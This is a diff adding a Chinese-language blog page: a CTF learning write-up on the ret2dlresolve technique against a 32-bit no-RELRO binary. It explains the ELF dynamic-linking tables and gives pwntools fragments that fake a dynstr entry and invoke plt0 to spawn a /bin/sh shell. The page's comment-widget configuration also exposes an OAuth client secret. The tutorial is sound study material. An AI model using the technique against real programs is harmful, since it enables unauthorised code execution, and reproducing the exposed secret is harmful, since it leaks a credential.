@@ -1,0 +1,808 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xyyr.png">
+  <link rel="icon" href="/img/xyyr.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xyyr">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="title:ret2dl学习以及对应符号表解析1（no relro）tags:pwnret2dl学习以及对应符号表解析1前置知识 动态链接（程序默认使用）：程序内只存一个函数名称，用ld动态链接器来按照名字来找地址，需要.dynstr存名字、.dynsym存地址等元信息  .dynamic段（总索引），这是Elf32_Dyn类型数组，每项8字节，前4字节代表常量含义（d_tag），后4字节代表地">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xyyr">
+<meta property="og:url" content="https://xyyr-c.github.io/2026/08/16/ret2dl%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E7%AC%A6%E5%8F%B7%E8%A1%A8%E8%A7%A3%E6%9E%901/index.html">
+<meta property="og:site_name" content="xyyr">
+<meta property="og:description" content="title:ret2dl学习以及对应符号表解析1（no relro）tags:pwnret2dl学习以及对应符号表解析1前置知识 动态链接（程序默认使用）：程序内只存一个函数名称，用ld动态链接器来按照名字来找地址，需要.dynstr存名字、.dynsym存地址等元信息  .dynamic段（总索引），这是Elf32_Dyn类型数组，每项8字节，前4字节代表常量含义（d_tag），后4字节代表地">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608162144825.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608162145105.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608162145292.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608162145293.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608162145294.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191511199.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191512004.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191512005.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191512007.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191512008.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191512009.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191512010.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191512011.png">
+<meta property="article:published_time" content="2026-08-16T13:26:50.703Z">
+<meta property="article:modified_time" content="2026-08-19T12:11:54.595Z">
+<meta property="article:author" content="xyyr">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608162144825.png">
+  
+  
+  
+  <title>xyyr</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/links.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xyyr-c.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xyyr</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/post.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-08-16 21:26" pubdate>
+          2026年8月16日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2026年8月19日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <hr>
+<h2 id="title-ret2dl学习以及对应符号表解析1（no-relro）tags-pwn"><a href="#title-ret2dl学习以及对应符号表解析1（no-relro）tags-pwn" class="headerlink" title="title:ret2dl学习以及对应符号表解析1（no relro）tags:pwn"></a>title:ret2dl学习以及对应符号表解析1（no relro）<br>tags:pwn</h2><h1 id="ret2dl学习以及对应符号表解析1"><a href="#ret2dl学习以及对应符号表解析1" class="headerlink" title="ret2dl学习以及对应符号表解析1"></a>ret2dl学习以及对应符号表解析1</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
+<li><p>动态链接（程序默认使用）：程序内只存一个函数名称，用ld动态链接器来按照名字来找地址，需要.dynstr存名字、.dynsym存地址等元信息</p>
+</li>
+<li><p>.dynamic段（总索引），这是Elf32_Dyn类型数组，每项8字节，前4字节代表常量含义（d_tag），后4字节代表地址或值。</p>
+<table>
+<thead>
+<tr>
+<th align="left">d_tag 常量</th>
+<th align="left">值</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>DT_STRTAB</code></td>
+<td align="left">5</td>
+<td align="left">指向 <strong>.dynstr</strong>（字符串表）</td>
+</tr>
+<tr>
+<td align="left"><code>DT_SYMTAB</code></td>
+<td align="left">6</td>
+<td align="left">指向 <strong>.dynsym</strong>（符号表）</td>
+</tr>
+<tr>
+<td align="left"><code>DT_JMPREL</code></td>
+<td align="left">23</td>
+<td align="left">指向 <strong>.rel.plt</strong>（重定位表）</td>
+</tr>
+<tr>
+<td align="left"><code>DT_VERSYM</code></td>
+<td align="left">0x6ffffff0</td>
+<td align="left">指向 .gnu.version（版本表，64 位时可能使伪造复杂）</td>
+</tr>
+</tbody></table>
+<p>用readelf -d 来直接查询值</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608162144825.png" srcset="/img/loading.gif" lazyload alt="image-20260816204828356"></p>
+</li>
+<li><p>relro保护机制：部分开启时（默认）.dynamic不可写，got可写。全加载时都是只读，不可写。</p>
+</li>
+<li><p>实际查询时调用_dl_runtime_resolve来调表查询，参数为link_map*，reloc（偏移）</p>
+</li>
+<li><p>如图为puts初次调用时对应的过程，先plt表，plt表指向got表的地址，got表由于还没存储真实地址，指向了plt+6的位置，这里对应了调用重定位函数。</p>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608162145105.png" srcset="/img/loading.gif" lazyload alt="image-20260816210320886"></p>
+<p>下图第二个位置就是plt跳转的第一个位置</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608162145292.png" srcset="/img/loading.gif" lazyload alt="image-20260816210639446"></p>
+<p>栈内显示压入的是0xf7ffda70与0x18作为linkmap*与reloc，其中也可以看到dynamic段的位置</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608162145293.png" srcset="/img/loading.gif" lazyload alt="image-20260816211209712"></p>
+<p>如图是.dynamic的位置与值</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608162145294.png" srcset="/img/loading.gif" lazyload alt="image-20260816211350565"></p>
+<p>以下是linkmap对应的内容</p>
+<table>
+<thead>
+<tr>
+<th><code>l_info[DT_JMPREL/SYMTAB/STRTAB]</code></th>
+<th>动态段索引表，链接器加载时把 <code>.rela.plt/.dynsym/.dynstr</code> 的地址填进对应槽位</th>
+<th align="center">决定 <code>reloc_arg</code>、<code>r_info</code>、<code>st_name</code> 这些偏移的”基准点”，所以它们必须相对这几个表算</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>l_addr</code></td>
+<td>该对象的加载基址（no-PIE 主程序 &#x3D; 0）</td>
+<td align="center"><strong>PIE 的关键</strong>：<code>r_offset</code> 会被加上 <code>l_addr</code>，PIE 下你要把 <code>r_offset</code> 写成相对值或先泄基址，否则写飞</td>
+</tr>
+<tr>
+<td><code>l_scope</code></td>
+<td>符号查找的作用域链表</td>
+<td align="center">决定 <code>dl_lookup_symbol_x</code> 从哪些库找符号——正是它让 <code>system</code> 能在 libc 里被找到</td>
+</tr>
+<tr>
+<td><code>l_versions</code></td>
+<td>符号版本表（配 <code>DT_VERSYM</code>）</td>
+<td align="center">高版本 glibc 会拿伪 Sym 索引查它，越界崩溃 → <code>st_other=1</code> 跳过</td>
+</tr>
+<tr>
+<td><code>l_ld</code></td>
+<td><code>.dynamic</code> 段指针</td>
+<td align="center"><code>l_info[]</code> 的数据源，利用中不直接接触</td>
+</tr>
+<tr>
+<td><code>l_next/l_prev</code></td>
+<td>加载对象链表</td>
+<td align="center">仅加载&#x2F;卸载用，利用中无关</td>
+</tr>
+</tbody></table>
+<h2 id="norelro"><a href="#norelro" class="headerlink" title="norelro"></a>norelro</h2><p>先找dynamic中strtab，即dynamic中记载着字符串表对应的位置</p>
+<p>本题中为0x804b1a0-&gt; 0x804826c</p>
+<p>readelf给出来的是解析出来的值，不是存储它的地址，所以还需要这样来找。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191511199.png" srcset="/img/loading.gif" lazyload alt="image-20260818214346838"></p>
+<p>在dynsym中read是第三项，每项占16字节,读取前4个字节就是read符号名在dynstr中偏移。即*(dyn_str_addr + offset) &#x3D;”read\x00” </p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191512004.png" srcset="/img/loading.gif" lazyload alt="image-20260818215745799"></p>
+<p>以下是动态符号表（dynsym）中数据项的定义</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  Elf32_Word  st_name;   <span class="hljs-comment">// 0-3  字节：符号名在 .dynstr 中的偏移</span><br>  Elf32_Addr  st_value;  <span class="hljs-comment">// 4-7  字节：符号地址（未解析时=0）</span><br>  Elf32_Word  st_size;   <span class="hljs-comment">// 8-11 字节：符号大小</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_info; <span class="hljs-comment">// 12 字节：类型+绑定（0x12 = GLOBAL | FUNC）</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other;<span class="hljs-comment">// 13 字节：可见性（通常 0）</span><br>  Elf32_Half  st_shndx;  <span class="hljs-comment">// 14-15 字节：所在节索引</span><br>&#125; Elf32_Sym;<br></code></pre></td></tr></table></figure>
+
+<p>保持原项的原因是解析是仍然是从read开始，先从这些表中找的偏移。修改了找dynstr表的地址，那么dynstr从自定义bss基址寻址，偏移按照原本read的偏移，所以要在该位置写入system。</p>
+<p>这里的bss_system其实是自定义的假的dynstr表的地址，加上对应的偏移会使得它索引该位置。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">system_str_addr = bss_system + st_name<br>p.send(stage_read(system_str_addr, <span class="hljs-number">8</span>).ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>p.send(<span class="hljs-string">b&#x27;system\x00&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>由于got表已经写入了read的真实缓存，所以不会触发解析，read正常执行，下一步在bss写入bin_sh，最后手动跳转执行read的解析</p>
+<p>read是第三项，8+8&#x3D;0x10，偏移是0x10</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191512005.png" srcset="/img/loading.gif" lazyload alt="image-20260818221922431"></p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm">typedef struct &#123;<br>  <span class="hljs-type">Elf32_Addr</span> r_offset;  // 0-3 字节：要写到哪（通常是 <span class="hljs-type">GOT</span> 表项地址）<br>  <span class="hljs-type">Elf32_Word</span> r_info;    // 4-7 字节：高 24 位=符号在 dynsym 中的下标，低 8 位=重定位类型<br>&#125; <span class="hljs-type">Elf32_Rel</span>;  <br></code></pre></td></tr></table></figure>
+
+<p>plt0的位置为0x8049020，压入参数并调用dl_runtime对应的解析。plt0对应函数是所有plt桩的解析函数。</p>
+<p>动态触发强行触发解析后，将read改为system。</p>
+<p>未进行动态解析时</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191512007.png" srcset="/img/loading.gif" lazyload alt="image-20260818223034830"></p>
+<p>第一次read后对应的got表地址</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191512008.png" srcset="/img/loading.gif" lazyload alt="image-20260818222642091"></p>
+<p>经过解析后的got表地址（dl重定位完毕后，会自行跳转到解析出的地址进行执行）</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191512009.png" srcset="/img/loading.gif" lazyload alt="image-20260818222818216"></p>
+<p>read自行重定位时压入的便是偏移，然后调转到plt0。这里push的0x10就是找的reloc_arg偏移。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191512010.png" srcset="/img/loading.gif" lazyload alt="image-20260818223314458"></p>
+<p>最后直接执行该plt函数，压入0x10偏移便可以执行system（“&#x2F;bin&#x2F;sh”）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 阶段4: 触发解析</span><br><br>payload  = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">76</span><br>payload += p32(plt0)<br>payload += p32(reloc_arg)<br>payload += p32(<span class="hljs-number">0xdeadbeef</span>)          <span class="hljs-comment"># 伪返回地址 (占位)</span><br>payload += p32(binsh)               <span class="hljs-comment"># system 的第一个参数</span><br><span class="hljs-comment">#debug()</span><br><br>p.send(payload.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>最终执行</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202608191512011.png" srcset="/img/loading.gif" lazyload alt="image-20260819151016007"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://xyyr-c.github.io/2026/08/16/ret2dl学习以及对应符号表解析1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xyyr</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年8月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/08/19/ret2dl%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E7%AC%A6%E5%8F%B7%E8%A1%A8%E8%A7%A3%E6%9E%902%EF%BC%88partial-relro%EF%BC%89/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/08/11/writeup-rosetta-calibration/" title="KCTF 2026 Rosetta Calibration">
+                        <span class="hidden-mobile">KCTF 2026 Rosetta Calibration</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"Ov23liOzmAtwEFUyS6IV","clientSecret":"430e9946d3d88b2b9d10d34d9ace5dda909038d5","repo":"xyyr-c.github.io","owner":"xyyr-c","admin":["xyyr-c"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":false,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '1758b5496ab4f295de6d23bedaa08dad'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+<script src="/js/particle.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
